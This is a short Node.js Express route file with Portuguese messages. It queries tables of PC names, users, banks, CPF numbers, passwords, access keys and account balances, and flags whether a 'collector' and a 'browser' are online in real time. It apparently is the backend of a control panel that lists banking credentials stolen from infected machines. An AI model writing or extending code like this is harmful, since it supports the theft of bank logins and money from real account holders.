const express = require('express');
const { sequelize } = require('../models');

const router = express.Router();

router.get('/', async (req, res) => {
  try {
    const query = `
      SELECT 
        NFCT.ID,
        NFCT.PC,
        NFCT.USER,
        NFCT.BANCO,
        B_BB.PERFIL,
        B_BB.TIPOACESSO,
        B_BB.CHAVEJ,
        B_BB.CPF,
        B_BB.SENHA,
        B_BB.DT_INCLUSAO,
        B_BB.SALDO,
        B_BB.TOTAL,
        B_BB.DT_COLLECTOR,
        B_BB.DT_BROWSER,
        NFCT.STATUSRESUMO,
        CASE 
          WHEN TIMESTAMPDIFF(SECOND, B_BB.DT_COLLECTOR, NOW()) < 4 THEN 1 
          ELSE 0 
        END AS IS_COLLECTOR_ONLINE,
        CASE 
          WHEN TIMESTAMPDIFF(SECOND, B_BB.DT_BROWSER, NOW()) < 4 THEN 1 
          ELSE 0 
        END AS IS_BROWSER_ONLINE
      FROM 
        B_BB
      INNER JOIN 
        NFCT ON B_BB.FK_ID_NFCT = NFCT.id
      WHERE 
        B_BB.id IN (SELECT MAX(id) FROM B_BB GROUP BY FK_ID_NFCT)
    `;
    const data = await sequelize.query(query, {
      type: sequelize.QueryTypes.SELECT
    });

    res.status(200).json(data);
  } catch (error) {
    console.error('Erro ao buscar registros:', error.message);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
